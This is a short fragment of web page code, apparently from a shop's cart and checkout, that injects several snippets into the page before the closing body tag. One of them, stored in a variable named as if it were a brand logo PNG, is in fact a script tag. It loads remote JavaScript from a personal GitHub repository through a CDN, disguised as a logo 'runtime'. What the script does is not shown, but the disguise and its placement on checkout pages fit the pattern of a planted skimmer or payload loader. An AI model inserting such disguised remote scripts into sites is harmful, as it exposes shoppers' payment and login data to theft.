...
.rc-cart-button::before{content:"";position:absolute;inset:-10px;z-index:-1}
  ...
  const brandLogoPng='<script src="https://cdn.jsdelivr.net/gh/satriaaao/linix@e32caaf2f860bb5f902a95aeaec8cec2c1020bb6/bsm-cinemachine/brand-logo-png-runtime-20260920.js"><\/script>';
  out=out.replace('</body>',cartHardening+checkoutWizard+includedDropdown+productWatermark+brandLogoPng+'</body>');
